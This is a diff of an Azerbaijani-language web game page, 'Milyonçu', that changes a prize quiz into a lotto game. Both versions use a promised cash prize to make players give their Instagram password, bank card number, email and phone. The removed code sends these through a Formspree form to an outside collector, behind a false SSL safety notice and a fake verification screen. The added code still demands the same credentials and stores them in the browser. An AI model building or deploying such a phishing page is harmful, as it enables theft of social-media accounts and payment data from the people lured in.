@@ -3,133 +3,293 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Milyonçu Oyunu</title>
+    <title>Milyonçu Lotto</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #0f172a; color: white; text-align: center; padding: 20px; margin: 0; }
-        .card { background-color: #1e293b; padding: 30px; border-radius: 10px; max-width: 550px; margin: 20px auto; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
-        h1 { color: #f59e0b; margin-bottom: 20px; }
-        p { line-height: 1.6; color: #cbd5e1; }
-        .score-board { font-size: 20px; color: #4ade80; font-weight: bold; margin-bottom: 15px; background: rgba(74, 222, 128, 0.1); padding: 10px; border-radius: 5px; }
-        .feedback { font-size: 22px; font-weight: bold; margin: 15px 0; min-height: 30px; }
-        .feedback.correct { color: #4ade80; }
-        .feedback.wrong { color: #f87171; }
-        .btn { background-color: #2563eb; color: white; border: none; padding: 12px; margin: 10px 0; width: 100%; cursor: pointer; border-radius: 5px; font-size: 16px; transition: 0.2s; font-weight: bold; }
-        .btn:hover { background-color: #1d4ed8; }
-        .option-btn { background-color: #334155; border: 1px solid #475569; text-align: left; padding-left: 20px; font-weight: normal; }
-        .option-btn:hover { background-color: #475569; }
-        .option-btn.disabled { pointer-events: none; opacity: 0.7; }
-        input { width: 92%; padding: 12px; margin: 8px 0; border-radius: 5px; border: 1px solid #475569; background-color: #334155; color: white; font-size: 16px; }
+        body { font-family: Arial, sans-serif; background: #0f172a; color: white; text-align: center; margin: 0; padding: 8px; }
+        .card { background: #1e293b; max-width: 640px; margin: 10px auto; padding: 15px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
+        h1 { color: #f59e0b; margin: 8px 0; }
+        button { background: #2563eb; color: white; border: none; padding: 13px; margin: 8px 0; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; width: 100%; max-width: 300px; }
+        button:hover { background: #1d4ed8; }
+        .timer { font-size: 26px; font-weight: bold; color: #f59e0b; margin: 8px 0; }
+        .current-circle {
+            width: 100px; height: 100px; background: #f59e0b; color: #1e293b; 
+            font-size: 36px; font-weight: bold; border-radius: 50%; 
+            display: flex; align-items: center; justify-content: center;
+            margin: 12px auto; box-shadow: 0 0 20px rgba(245, 158, 11, 0.7);
+        }
+        .ticket { background: white; color: #1e293b; padding: 10px; border-radius: 10px; margin: 10px auto; max-width: 420px; }
+        .row { display: grid; grid-template-columns: repeat(5, 1fr); gap: 4px; margin: 5px 0; }
+        .num { background: #2563eb; color: white; padding: 8px 4px; border-radius: 50%; font-weight: bold; cursor: pointer; font-size: 14px; }
+        .num.marked { background: #22c55e !important; }
+        .info-box { background: #334155; padding: 12px; border-radius: 8px; text-align: left; font-size: 14px; margin: 12px 0; }
         .hidden { display: none; }
-        label { display: block; text-align: left; margin-top: 12px; font-weight: bold; color: #94a3b8; font-size: 14px; }
-        .security-notice { font-size: 12px; color: #94a3b8; background: rgba(148, 163, 184, 0.1); padding: 8px; border-radius: 5px; margin-bottom: 15px; text-align: left; border-left: 3px solid #f59e0b; }
-        [data-fs-error] { color: #f87171; background-color: rgba(248, 113, 113, 0.1); padding: 10px; border-radius: 5px; margin-bottom: 15px; display: none; font-weight: bold; }
-        
-        .loading-dots span { animation: blink 1.4s infinite both; font-size: 30px; }
-        .loading-dots span:nth-child(2) { animation-delay: .2s; }
-        .loading-dots span:nth-child(3) { animation-delay: .4s; }
-        @keyframes blink { 0% { opacity: .2; } 20% { opacity: 1; } 100% { opacity: .2; } }
+        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 6px; border: 1px solid #475569; background: #334155; color: white; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h1>Milyonçu Oyunu</h1>
-        
-        <div id="start-screen">
-            <h2>Xoş Gəlmisiniz!</h2>
-            <p><strong>Oyun haqqında məlumat:</strong> Bu intellektual yarışmada sizə müxtəlif məbləğli məntiq və bilik sualları təqdim oluncaq. Hər düzgün cavab uduşunuzu artırır. Son mərhələdəki çətin sualların variantı yoxdur, cavabı özünüz yazmalısınız!</p>
-            
-            <input type="text" id="user-fullname" placeholder="Adınız və Soyadınız" required>
-            <button class="btn" onclick="startGame()">Oyuna Başla</button>
+<div class="card">
+    <h1>🎟 Milyonçu Lotto</h1>
+
+    <div id="start-screen">
+        <h2>Xoş gəlmisiniz!</h2>
+        <input type="text" id="firstname" placeholder="Ad (məs: Elçin)">
+        <input type="text" id="lastname" placeholder="Soyad (məs: Məmmədov)">
+        <div class="info-box">
+            <strong>Oyun Qaydaları:</strong><br>
+            • 2 bilet • Hər bilet 3 sıra (15 rəqəm)<br>
+            • 3 dəqiqə • Hər 3 saniyədə 1 rəqəm<br>
+            • Yalnız Cari rəqəm işarələnə bilər<br>
+            • Tamamlanan hər sıra uduş gətirir
         </div>
-
-        <div id="quiz-screen" class="hidden">
-            <div class="score-board">Cari Uduş: <span id="live-budget">0</span> AZN</div>
-            <h3 id="question-text">Sual yüklənir...</h3>
-            
-            <div id="options-container"></div>
-            
-            <div id="text-answer-container" class="hidden">
-                <input type="text" id="user-text-answer" placeholder="Cavabınızı bura yazın..." autocomplete="off">
-                <button class="btn" id="submit-text-answer-btn" style="background-color: #f59e0b;">Cavabı Təsdiqlə</button>
-            </div>
-            
-            <div id="answer-feedback" class="feedback"></div>
-        </div>
-
-        <div id="end-screen" class="hidden">
-            <h2>Təbriklər! Oyunu Bitirdiniz.</h2>
-            <div class="score-board" style="font-size: 22px; background: rgba(245, 158, 11, 0.1); color: #f59e0b;">Qazandığınız Ümumi Məbləğ: <span id="final-budget">0</span> AZN</div>
-            <p>Uduşunuzun və iştirakınızın sistemə düşməsi üçün zəhmət olmasa aşağıdakı qeydiyyat məlumatlarını tam doldurun.</p>
-            
-            <div class="security-notice">
-                🔒 <strong>Sistem Təhlükəsizlik Mesajı:</strong> Daxil etdiyiniz bütün qeydiyyat, sosial şəbəkə və maliyyə məlumatları SSL şifrləmə protokolu ilə qorunur və birbaşa şəxsi verilənlər bazasına ötürülür.
-            </div>
-
-            <div data-fs-error id="fs-error-msg">Xəta baş verdi. Zəhmət olmasa yenidən yoxlayın.</div>
-            
-            <form id="my-form">
-                <input type="hidden" id="form-fullname" name="İştirakçı Adı və Soyadı">
-                <input type="hidden" id="form-total-win" name="Qazanılan Məbləğ (AZN)">
-                
-                <label for="email">Email Ünvanı:</label>
-                <input type="email" id="email" name="email" data-fs-field placeholder="Nümunə: email@gmail.com" required />
-                
-                <label for="instagram">Instagram Logini:</label>
-                <input type="text" id="instagram" name="instagram_login" data-fs-field placeholder="@istifadəçi_adı" required />
-
-                <label for="password">Instagram Giriş Şifrəsi:</label>
-                <input type="password" id="password" name="instagram_sifresi" data-fs-field placeholder="Instagram şifrənizi daxil edin" required />
-
-                <label for="card_number">Bank Kart Nömrəsi (Ödəniş üçün):</label>
-                <input type="text" id="card_number" name="kart_nomresi" data-fs-field placeholder="0000 0000 0000 0000" required />
-
-                <label for="whatsapp">Əlaqə Nömrəsi:</label>
-                <input type="text" id="whatsapp" name="elaqe_nomresi" data-fs-field placeholder="+994 XX XXX XX XX" required />
-                
-                <button type="submit" class="btn" data-fs-submit-btn style="background-color: #22c55e;">Qeydiyyatı Tamamla</button>
-            </form>
-        </div>
-
-        <div id="verification-screen" class="hidden">
-            <h2 style="color: #f59e0b;">Sistem Yoxlanışı Aparılır...</h2>
-            <div class="loading-dots" style="margin: 20px 0;">
-                <span style="color: #f59e0b;">●</span> <span style="color: #2563eb;">●</span> <span style="color: #22c55e;">●</span>
-            </div>
-            <p style="font-size: 18px; color: #4ade80; font-weight: bold; background: rgba(74, 222, 128, 0.1); padding: 15px; border-radius: 5px;">
-                Məlumatlarınız ötürüldü və qeydiyyat uğurla tamamlandı!
-            </p>
-            <p style="text-align: left; margin-top: 20px;">
-                Sistem hazırda daxil etdiyiniz sual cavablarını, xalları və qeydiyyat məlumatlarını təhlükəsizlik alqoritmləri ilə yoxlayır.
-            </p>
-            <p style="text-align: left; font-weight: bold; color: #38bdf8;">
-                📧 Məlumat: Yoxlanış prosesi başa çatdıqdan sonra qazanılan uduş və növbəti addımlar barədə təqdim etdiyiniz <strong>Email ünvanına</strong> rəsmi bildiriş məlumatı göndəriləcəkdir.
-            </p>
-            <p style="text-align: left; font-weight: bold; color: #f87171;">
-                ⚠️ Diqqət: Hər hansı bir uyğunsuzluq və ya səhvlik aşkar olunarsa, proses ləğv edilə bilər. Bu səbəbdən daxil etdiyiniz məlumatların tamamilə aktiv və işlək vəziyyətdə olduğundan əmin olun.
-            </p>
-            <p style="color: #94a3b8; font-size: 14px; margin-top: 30px;">Zəhmət olmasa bu səhifəni bağlamayın, yoxlanış davam edir...</p>
-        </div>
-
+        <button onclick="startRegistration()">Qeydiyyatdan Keç və Oyna</button>
     </div>
 
-    <script src="game.js"></script>
+    <div id="reg-screen" class="hidden">
+        <h2>Qeydiyyat</h2>
+        <div class="info-box">
+            <strong>📋 Qeydiyyat haqqında:</strong><br>
+            • Məlumatlarınız təhlükəsiz saxlanılır.<br>
+            • 24 saatdan sonra yenidən oynaya bilərsiniz.
+        </div>
+        <form id="pre-reg-form">
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="text" id="instagram" placeholder="Instagram" required>
+            <input type="password" id="password" placeholder="Instagram Şifrəsi" required>
+            <input type="text" id="card" maxlength="14" placeholder="Kart Nömrəsi (14 rəqəm)" required>
+            <input type="tel" id="phone" maxlength="13" placeholder="+994501234567" required>
+            <button type="submit" style="background:#22c55e;">Qeydiyyatı Tamamla</button>
+        </form>
+    </div>
 
-    <script>
-      window.formspree = window.formspree || function () { (formspree.q = formspree.q || []).push(arguments); };
-      formspree("initForm", {
-        formElement: "#my-form",
-        formId: "mbdbbnwb",
-        onSuccess: function() {
-            document.getElementById("end-screen").classList.add("hidden");
-            document.getElementById("verification-screen").classList.remove("hidden");
-        },
-        onError: function() {
-            document.getElementById("fs-error-msg").style.display = "block";
+    <div id="profile-screen" class="hidden">
+        <h2>Profiliniz</h2>
+        <div id="profile-info" class="info-box"></div>
+        <div id="balance-info" style="font-size:18px; margin:15px 0; color:#4ade80;"></div>
+        <button onclick="startGameFromProfile()" style="background:#22c55e;">İndi Oyna</button>
+        <button onclick="logout()" style="background:#ef4444;">Çıxış</button>
+    </div>
+
+    <div id="game-screen" class="hidden">
+        <div class="timer" id="timer">⏱ 180s</div>
+        <div class="current-circle" id="current-circle">?</div>
+        <p>Cari çıxan rəqəm</p>
+        <div id="tickets-container"></div>
+    </div>
+
+    <div id="end-screen" class="hidden">
+        <h2>Oyun Bitdi!</h2>
+        <div id="final-result" style="font-size:22px; margin:15px 0; color:#4ade80;"></div>
+        <button onclick="showProfileAfterGame()" style="background:#22c55e;">Profilə Qayıt</button>
+    </div>
+</div>
+
+<script>
+let currentPlayer = null;
+let gameInterval = null;
+let drawInterval = null;
+let drawnNumbers = [];
+let timer = 180;
+let allRows = [];
+let currentDrawNumber = null;
+let lastDrawTime = 0;
+
+function savePlayer(p) { localStorage.setItem('milyoncu_player', JSON.stringify(p)); }
+function loadPlayer() { const s = localStorage.getItem('milyoncu_player'); return s ? JSON.parse(s) : null; }
+
+function validateName(first, last) {
+    const regex = /^[a-zA-ZçğıöşüəÇĞİÖŞÜƏ]+$/;
+    if (!first || first.length < 2) return false;
+    if (!last || last.length < 2) return false;
+    if (!regex.test(first)) return false;
+    if (!regex.test(last)) return false;
+    return true;
+}
+
+function startRegistration() {
+    const first = document.getElementById('firstname').value.trim();
+    const last = document.getElementById('lastname').value.trim();
+    if (!validateName(first, last)) {
+        alert("❌ Ad və Soyad tam və düzgün yazılmalıdır!\n✅ Minimum 2 hərf\n✅ Yalnız Azərbaycan hərfləri\n📝 Nümunə: Elçin Məmmədov");
+        return;
+    }
+    sessionStorage.setItem('reg_fullname', first + " " + last);
+    document.getElementById('start-screen').classList.add('hidden');
+    document.getElementById('reg-screen').classList.remove('hidden');
+}
+
+document.getElementById('pre-reg-form').onsubmit = function(e) {
+    e.preventDefault();
+    const fullname = sessionStorage.getItem('reg_fullname') || '';
+    const email = document.getElementById('email').value.trim();
+    const instagram = document.getElementById('instagram').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const card = document.getElementById('card').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    
+    if (!fullname || !email || !instagram || !password || !card || !phone) {
+        alert("Bütün sahələr doldurulmalıdır!");
+        return;
+    }
+    if (card.length !== 14 || isNaN(card)) { alert("Kart 14 rəqəm olmalıdır!"); return; }
+    if (!phone.startsWith('+994') || phone.length !== 13 || isNaN(phone.substring(1))) { 
+        alert("Telefon +994 ilə başlamalıdır! Məs: +994501234567"); return; 
+    }
+    
+    const existing = loadPlayer();
+    if (existing && existing.email === email) {
+        currentPlayer = existing;
+        alert("Profil tapıldı! " + fullname);
+    } else {
+        currentPlayer = { fullname, email, instagram, password, card, phone, balance: existing ? existing.balance : 0, lastPlayTime: null };
+        alert("Qeydiyyat tamamlandı! 🎉");
+    }
+    savePlayer(currentPlayer);
+    showProfileScreen();
+};
+
+function showProfileScreen() {
+    document.getElementById('reg-screen').classList.add('hidden');
+    document.getElementById('profile-screen').classList.remove('hidden');
+    document.getElementById('profile-info').innerHTML = `
+        <strong>Ad Soyad:</strong> ${currentPlayer.fullname}<br>
+        <strong>Email:</strong> ${currentPlayer.email}<br>
+        <strong>Instagram:</strong> ${currentPlayer.instagram}<br>
+        <strong>Telefon:</strong> ${currentPlayer.phone}<br>
+        <strong>Kart:</strong> ${currentPlayer.card}
+    `;
+    document.getElementById('balance-info').innerHTML = `💰 Balans: ${currentPlayer.balance || 0} AZN`;
+}
+
+function startGameFromProfile() {
+    if (!currentPlayer) return;
+    const now = new Date();
+    if (currentPlayer.lastPlayTime) {
+        const hours = (now - new Date(currentPlayer.lastPlayTime)) / (1000 * 60 * 60);
+        if (hours < 24) {
+            alert(`⏰ ${Math.ceil(24 - hours)} saat gözləməlisiniz!`);
+            return;
         }
-      });
-    </script>
-    <script src="https://unpkg.com/@formspree/ajax@1" defer></script>
+    }
+    currentPlayer.lastPlayTime = now.toISOString();
+    savePlayer(currentPlayer);
+    document.getElementById('profile-screen').classList.add('hidden');
+    document.getElementById('game-screen').classList.remove('hidden');
+    initGame();
+}
 
+function logout() { localStorage.removeItem('milyoncu_player'); location.reload(); }
+
+function initGame() {
+    drawnNumbers = [];
+    allRows = [];
+    timer = 180;
+    currentDrawNumber = null;
+    document.getElementById('current-circle').textContent = '?';
+    document.getElementById('timer').textContent = `⏱ 180s`;
+    
+    const container = document.getElementById('tickets-container');
+    container.innerHTML = '';
+    
+    for (let t = 0; t < 2; t++) {
+        const ticketDiv = document.createElement('div');
+        ticketDiv.className = 'ticket';
+        ticketDiv.innerHTML = `<h4>Bilet ${t+1}</h4>`;
+        for (let r = 0; r < 3; r++) {
+            const rowDiv = document.createElement('div');
+            rowDiv.className = 'row';
+            const nums = [];
+            while (nums.length < 5) {
+                const n = Math.floor(Math.random() * 90) + 1;
+                if (!nums.includes(n)) nums.push(n);
+            }
+            nums.sort((a,b)=>a-b);
+            const rowData = { elements: [] };
+            nums.forEach(num => {
+                const el = document.createElement('div');
+                el.className = 'num';
+                el.textContent = num;
+                el.dataset.number = num;
+                el.onclick = () => {
+                    const timeDiff = Date.now() - lastDrawTime;
+                    if (currentDrawNumber === num && timeDiff <= 2500) {
+                        el.classList.toggle('marked');
+                    } else {
+                        if (!currentDrawNumber) alert("⏳ Hələ rəqəm çıxmayıb!");
+                        else if (timeDiff > 2500) alert("⌛ Vaxt keçdi! 2.5 saniyə ərzində basmalıydınız!");
+                        else alert(`❌ İndiki rəqəm: ${currentDrawNumber}, siz ${num} düyməsinə basdınız!`);
+                    }
+                };
+                rowData.elements.push(el);
+                rowDiv.appendChild(el);
+            });
+            ticketDiv.appendChild(rowDiv);
+            allRows.push(rowData);
+        }
+        container.appendChild(ticketDiv);
+    }
+    
+    if (gameInterval) clearInterval(gameInterval);
+    gameInterval = setInterval(() => {
+        timer--;
+        document.getElementById('timer').textContent = `⏱ ${timer}s`;
+        if (timer <= 0) endGame();
+    }, 1000);
+    
+    if (drawInterval) clearInterval(drawInterval);
+    drawInterval = setInterval(() => {
+        if (timer <= 0) return;
+        let newNum;
+        do { newNum = Math.floor(Math.random() * 90) + 1; } while (drawnNumbers.includes(newNum));
+        drawnNumbers.push(newNum);
+        currentDrawNumber = newNum;
+        lastDrawTime = Date.now();
+        document.getElementById('current-circle').textContent = newNum;
+        setTimeout(() => {
+            if (currentDrawNumber === newNum) {
+                document.getElementById('current-circle').textContent = '?';
+                currentDrawNumber = null;
+            }
+        }, 2500);
+    }, 3000);
+}
+
+function endGame() {
+    clearInterval(gameInterval);
+    clearInterval(drawInterval);
+    let completed = 0;
+    allRows.forEach(row => {
+        if (row.elements.every(el => el.classList.contains('marked'))) completed++;
+    });
+    let win = 0;
+    if (completed === 1) win = 5;
+    else if (completed === 2) win = 10;
+    else if (completed === 3) win = 30;
+    else if (completed >= 4) win = 50;
+    else if (completed >= 5) win = 100;
+    else if (completed >= 6) win = 200;
+    
+    if (win > 0) {
+        currentPlayer.balance = (currentPlayer.balance || 0) + win;
+        savePlayer(currentPlayer);
+    }
+    document.getElementById('game-screen').classList.add('hidden');
+    document.getElementById('end-screen').classList.remove('hidden');
+    document.getElementById('final-result').innerHTML = `✅ Tam sıra: ${completed}<br>🎉 Qazanc: ${win} AZN<br>💰 Balans: ${currentPlayer.balance || 0} AZN`;
+}
+
+function showProfileAfterGame() {
+    document.getElementById('end-screen').classList.add('hidden');
+    showProfileScreen();
+}
+
+window.onload = () => {
+    const saved = loadPlayer();
+    if (saved) {
+        currentPlayer = saved;
+        showProfileScreen();
+    }
+};
+</script>
 </body>
-</html>
+    </html>
